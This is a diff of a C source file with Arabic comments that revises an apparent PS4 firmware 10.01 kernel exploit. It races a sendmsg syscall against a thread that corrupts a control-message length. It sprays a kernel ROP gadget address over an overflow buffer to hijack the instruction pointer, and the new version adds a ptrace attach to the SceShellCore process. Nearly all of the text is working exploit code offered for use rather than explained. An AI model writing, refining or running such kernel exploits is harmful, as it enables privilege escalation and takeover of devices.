@@ -1,33 +1,26 @@
 #include <ps4.h>
 
-// --- الهياكل المفقودة (متوافقة مع libPS4) ---
-struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };
-struct msghdr {
-    void *msg_name; uint32_t msg_namelen; struct iovec *msg_iov;
-    int msg_iovlen; void *msg_control; uint32_t msg_controllen; int msg_flags;
-};
-
-typedef struct { uint64_t bits[16]; } cpuset_t;
-#define CPU_SET(n, p) ((p)->bits[(n)/64] |= (1ULL << ((n)%64)))
-#define CPU_ZERO(p) memset((p), 0, sizeof(cpuset_t))
-
-// --- إعدادات الاستغلال ---
+// إعدادات الاستغلال
 #define PS4_PAGE_SIZE 0x4000
-#define OVERFLOW_SIZE 1024 // زيادة الحجم لضمان التغطية الكاملة
+#define OVERFLOW_SIZE 1024 
 #define NCMSG         14
-#define OFFSET_TARGET 0x48 // الإزاحة الموثوقة لـ FreeBSD mbuf
 #define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
+
+// تعريف الثوابت لـ ptrace إذا لم تكن في الهيدر
+#ifndef PT_CONTINUE
+#define PT_CONTINUE 7
+#endif
 
 uint8_t *BaseArea;
 struct cmsghdr *ControlBuf;
 size_t ControlBufLen;
 volatile int stop_race = 0;
 uint64_t n_tries = 0;
-uint32_t current_delay = 40;
+uint32_t current_delay = 50;
 
-// --- 1. بناء البفر مع الرش التصاعدي من 0x48 ---
+// --- 1. بناء البفر بالرش الكثيف (Dense Spray) ---
 void BuildPrecisionBuffer(uint64_t kbase) {
-    printf_debug("[BUILD] Initializing Precision Spray (Offset: 0x48)...\n");
+    printf_debug("[BUILD] Spraying Gadgets (Dense Mode)...\n");
     
     size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
     size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
@@ -39,25 +32,21 @@ void BuildPrecisionBuffer(uint64_t kbase) {
     ControlBuf = (struct cmsghdr *)aligned_base;
     ControlBufLen = cmsgsize;
 
+    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
+    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
+
+    // الرش التصاعدي من الإزاحة 0 لسد ثغرة RIP: 0
+    for (int i = 0; i < OVERFLOW_SIZE - 8; i += 8) {
+        *(uintptr_t *)(overflow_ptr + i) = trigger;
+    }
+
     for (int i = 0; i < NCMSG; i++) {
         ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
         ControlBuf[i].cmsg_type = 7;
     }
-
-    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
-    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;
-
-    // --- الرش التصاعدي الموثوق ---
-    // نحن نترك أول 0x48 بايت "نظيفة" أو مملوءة بحذر، ثم نرش العنوان تصاعدياً
-    // لضمان أنه عند حدوث الـ Race، سيتم دهس الـ RIP بالـ Gadget يقيناً.
-    for (int i = OFFSET_TARGET; i < OVERFLOW_SIZE - 8; i += 8) {
-        *(uintptr_t *)(overflow_ptr + i) = trigger;
-    }
-
-    printf_debug("[BUILD] Spray active from +0x%x to +0x%x\n", OFFSET_TARGET, OVERFLOW_SIZE);
 }
 
-// --- 2. خيط التخريب (Wrecker) - Core 1 ---
+// --- 2. خيط التخريب (Wrecker) ---
 void *wrecker_thread(void *arg) {
     (void)arg;
     while (!stop_race) {
@@ -67,14 +56,13 @@ void *wrecker_thread(void *arg) {
         ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
         for(volatile int i = 0; i < 60; i++);
 
-        // التغيير التدريجي للتوقيت
         current_delay++;
-        if (current_delay > 1500) current_delay = 40; 
+        if (current_delay > 1500) current_delay = 50; 
     }
     return NULL;
 }
 
-// --- 3. خيط التنفيذ (Executor) - Core 2 ---
+// --- 3. خيط التنفيذ (Executor) ---
 void *executor_thread(void *arg) {
     (void)arg;
     struct msghdr msg;
@@ -83,31 +71,41 @@ void *executor_thread(void *arg) {
     msg.msg_controllen = (uint32_t)ControlBufLen;
     const int bad_fd = 666;
 
-    printf_debug("[EXEC] Racing started on Core 2...\n");
-    
     while (!stop_race) {
         n_tries++;
         syscall(28, bad_fd, &msg, 0); 
         
-        if (errno == 14) { // EFAULT الحلم!
+        if (errno == 14) { 
             stop_race = 1;
             printf_debug("[SUCCESS] *** EFAULT CAUGHT! ***\n");
-            printf_debug("[SUCCESS] Tries: %llu, Final Delay: %u\n", n_tries, current_delay);
             break;
         }
         
         if (n_tries % 250000 == 0) {
-            printf_debug("[INFO] Tries: %llu, Delay: %u, Still Stable...\n", n_tries, current_delay);
+            printf_debug("[INFO] Tries: %llu, Delay: %u\n", n_tries, current_delay);
         }
     }
     return NULL;
 }
 
+// --- المدخل الرئيسي ---
 int _main(struct thread *td) {
     (void)td;
     initKernel(); initLibc(); initSysUtil();
     
-    printf_debug("\n--- [PS4 10.01 PRECISION RACE] ---\n");
+    printf_debug("\n--- [PS4 TARGETED ATTACH + CONTINUE] ---\n");
+
+    // البحث عن SceShellCore
+    int targetPID = findProcess("SceShellCore");
+    if (targetPID > 0) {
+        printf_debug("[INFO] Found ShellCore (PID: %d). Attaching...\n", targetPID);
+        procAttach(targetPID);
+        
+        // استئناف العملية فوراً لضمان عدم حدوث Freeze للواجهة
+        // نستخدم ptrace المباشر لضمان وصول الإشارة
+        ptrace(PT_CONTINUE, targetPID, (void *)1, 0); 
+        printf_debug("[INFO] Attached and PT_CONTINUE sent.\n");
+    }
 
     uint64_t kbase = get_kernel_base();
     BuildPrecisionBuffer(kbase);
@@ -128,6 +126,10 @@ int _main(struct thread *td) {
     stop_race = 1;
     scePthreadJoin(wrid, NULL);
 
-    printf_debug("[FINISH] Exploit loop exited.\n");
+    if (targetPID > 0) {
+        procDetach(targetPID);
+        printf_debug("[INFO] Detached. Exploit Complete.\n");
+    }
+
     return 0;
 }
